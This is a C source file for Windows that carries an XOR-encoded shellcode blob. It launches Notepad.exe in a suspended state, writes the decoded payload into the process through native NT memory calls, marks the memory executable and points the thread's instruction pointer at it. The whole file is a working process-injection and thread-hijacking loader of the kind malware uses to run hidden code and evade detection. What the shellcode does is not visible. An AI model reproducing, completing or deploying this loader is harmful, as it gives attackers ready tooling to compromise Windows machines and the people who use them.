#include "header.h"

#define name "Notepad.exe"
#pragma warning (disable:4996)


unsigned char code[] =
"\xe5\x50\x98\xfe\xed\xf4\xdf\x1e\x11\x10\x52\x43\x54\x44"
"\x45\x47\x5f\x40\x3a\xd8\x68\x44\x84\x5c\x61\x48\x88\x50"
"\x1d\x4c\x8c\x54\x19\x70\xb0\x48\x6d\x74\x30\x89\x7b\x7a"
"\x7e\x03\xfc\x7c\x06\xf6\x85\x14\x4a\x56\x2f\x00\x0f\x6f"
"\xe0\xe9\x2e\x63\x24\xe5\xc5\xcb\x0b\x19\x0a\x12\xd6\x0e"
"\x7f\xd5\x13\x6c\x1b\x53\x85\xdf\xd7\xde\x49\x48\x4b\x02"
"\xc8\x8c\x3b\x29\x09\x41\x93\x12\xce\x0c\x5f\x02\xf2\x38"
"\x5b\x33\x7c\xac\x9c\x28\x39\x8f\xba\x33\xfe\x40\xff\x3e"
"\x68\xbe\x26\x5b\xa4\x24\x5e\xae\xcd\x21\xa2\xab\x68\x25"
"\x66\xa7\xa1\x78\xee\x6b\xd1\x9f\xd3\xba\x99\xd5\xaa\x43"
"\xe0\x4c\xcf\xd2\x02\xc8\xaf\xc3\x8c\x5c\xe9\xcf\x0a\x8c"
"\xcb\xc6\x0e\xc4\x9b\xcf\xb8\x68\xfa\x31\xb9\x34\xf7\xbf"
"\x61\xf1\xeb\xf3\xed\xea\xee\xec\xe8\xf0\xea\xf3\xec\xf6"
"\xe7\x2d\x4d\x80\xe2\xf0\x5a\x44\xff\xe7\x80\x82\x93\x51"
"\xcf\x35\x88\x21\x2e\x2f\x8e\x9a\x6f\xd5\xd7\xd6\xc9\xc8"
"\xcb\xca\xcd\x84\x42\x43\xc0\xc1\xc3\xc2\x84\x7e\xf6\x4d"
"\x96\x7f\x04\x2f\x46\x1c\xe2\xd4\xfb\xb1\x49\x54\x60\x49"
"\x6a\x09\x3c\xa0\x68\x2e\xc5\xd0\xe9\x92\xeb\x60\x18\x02"
"\x90\xe1\x5c\xa1\x0a\x6a\x74\x70\x1d\x45\x5e\x97\xcb\xef"
"\xc6\x71\x74\x78\x74\x38\x6c\x70\x6e\x0a\x0d";

#define KEY 0x19

BOOL CreateProc(IN LPCSTR ProcName, OUT DWORD *ProcId, OUT HANDLE *lpProc, OUT HANDLE* lpThread) {
	char Path[MAX_PATH * 2];
	char wDir[MAX_PATH];

	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	RtlSecureZeroMemory(&si, sizeof(STARTUPINFO));
	RtlSecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	DWORD tmp_procId = NULL;
	si.cb = sizeof(STARTUPINFO);

	if (!GetEnvironmentVariableA("WINDIR", wDir, MAX_PATH)) {
		printf("Error Getting ENV\tCode: 0x%ld\n", GetLastError());
		return FALSE;
	}

	sprintf(Path, "%s\\System32\\%s", wDir, ProcName);
	printf("Running %s\n", Path);

	if (!CreateProcessA(NULL, Path, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		printf("Failed Starting Process\tCode: 0x%ld\n", GetLastError());
		return FALSE;
	}

	*ProcId = pi.dwProcessId;
	*lpThread = pi.hThread;
	*lpProc = pi.hProcess;

	if (*lpProc != NULL && *lpThread != NULL && *ProcId != NULL) {
		return TRUE;
	}
	return FALSE;
}

BOOL WriteProc(IN HANDLE hProc, IN HMODULE hNTDLL, IN HANDLE hThread, OUT PVOID* lpBuffer) {
	size_t code_len = sizeof(code);
	DWORD oldProc;
	*lpBuffer = NULL;

	p_NtAllocateVirtualMemory pAlloc = (p_NtAllocateVirtualMemory)GetProcAddress(hNTDLL, "NtAllocateVirtualMemory");
	p_NtWriteVirtualMemory pWrite = (p_NtWriteVirtualMemory)GetProcAddress(hNTDLL, "NtWriteVirtualMemory");        // Get Address's For Needed NTAPI functions
	p_NtProtectVirtualMemory pProtect = (p_NtProtectVirtualMemory)GetProcAddress(hNTDLL, "NtProtectVirtualMemory");
	for (int i = 0; i < code_len; i++) {
		code[i] = code[i] ^ KEY ^ i; // Decode Shellcode
	}

	NTSTATUS status = pAlloc(hProc, lpBuffer, 0, &code_len, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE); // Allocate a Buffer For Shell_code with perms [RW-]
	if (status != STATUS_SUCCESS) {
		printf("Failed Allocating\n");
		return FALSE;
	}

	status = pWrite(hProc, *lpBuffer, code, code_len, NULL); // Write Into Buffer
	if (status != STATUS_SUCCESS) {
		printf("[!] Failed Writing");
		return FALSE;
	}
	
	status = pProtect(hProc, lpBuffer, &code_len, PAGE_EXECUTE_READ, &oldProc); // Chnage The Permissions
	if (status != STATUS_SUCCESS) {
		printf("[!] Failed Changing perms");
		return FALSE;
	}

	return TRUE;
 }

BOOL hJack(IN HANDLE hThread, IN PVOID rBuffer, IN HMODULE hNTDLL) {
	CONTEXT ThreadCtx = { .ContextFlags = CONTEXT_CONTROL };
	p_NtGetContextThread pGetContext = (p_NtGetContextThread)GetProcAddress(hNTDLL, "NtGetContextThread");
	p_NtSetContextThread pSetContext = (p_NtSetContextThread)GetProcAddress(hNTDLL, "NtSetContextThread");

	NTSTATUS status = pGetContext(hThread, &ThreadCtx);
	if (status != STATUS_SUCCESS) {
		printf("Failed Getting Thread Context");
		return FALSE;
	}

	ThreadCtx.Rip = rBuffer;

	status = pSetContext(hThread, &ThreadCtx);
	if (status != STATUS_SUCCESS) {
		printf("Failed Setting Context");
		return FALSE;
	}
	ResumeThread(hThread);
	WaitForSingleObject(hThread, INFINITE);

	return TRUE;
}
 
int main(int argc, char* argv[]) {
	HANDLE lProc = NULL;
	PVOID lpBuffer = NULL;
	HANDLE lpThread = NULL;
	DWORD lpProcID = NULL;
	HMODULE ndll;
	ndll = GetModuleHandleW(L"NTDLL");
	if (ndll == NULL) {
		return 1;
	}
	
	printf("[*] Starting Process In Suspened State\n");

	if (!CreateProc("Notepad.exe", &lpProcID, &lProc, &lpThread)) {
		printf("Failed Starting Process");
		return 1;
	}
	printf("[*] Started! [%ld]\n", lpProcID);

	printf("[*] Allocating and Writing into Buffer...\n");
	if (!WriteProc(lProc, ndll, lpThread, &lpBuffer)) {
		printf("Failed Writing Memory");
		return 1;
	}
	printf("[+] Done! Wrote %d-Bytes Into buffer\n			\\____0x%p\n", sizeof(code), lpBuffer);

	printf("[+] Hijacking Thread...");
	if (!hJack(lpThread, lpBuffer, ndll)) {
		printf("Failed hijacking");
		return 1;
	}


	return 0;
}